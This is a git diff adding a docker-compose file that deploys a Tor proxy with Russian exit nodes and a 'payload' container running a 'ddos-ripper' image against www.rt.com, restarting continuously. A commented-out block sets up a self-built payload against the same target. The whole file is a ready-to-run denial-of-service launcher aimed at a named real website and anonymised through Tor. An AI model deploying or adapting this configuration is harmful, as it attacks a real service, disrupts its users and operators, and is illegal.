@@ -1,0 +1,36 @@
+version: "3.9"
+services:
+  proxy:
+    image: "dperson/torproxy"
+    container_name: "proxy"
+    restart: always
+    #network_mode: "host" # FOR TEST
+    ports:
+      - "8118:8118"
+      - "9050:9050"
+    environment:
+      - LOCATION=RU
+      - TOR_NewCircuitPeriod=120
+      #- PASSWORD= # not sure how to use it properly
+
+# predefined payload
+  payload:
+    image: "nitupkcuf/ddos-ripper:latest"
+    container_name: "payload"
+    restart: always
+    environment:
+      - http_proxy="proxy:8118"
+    command:
+      - www.rt.com
+
+#self-build payload
+#  payload:
+#    build:
+#      context: ./runner
+#      dockerfile: Dockerfile
+#    container_name: "payload"
+#    restart: always
+#    environment:
+#      - http_proxy="proxy:8118"
+#    command:
+#      - www.rt.com
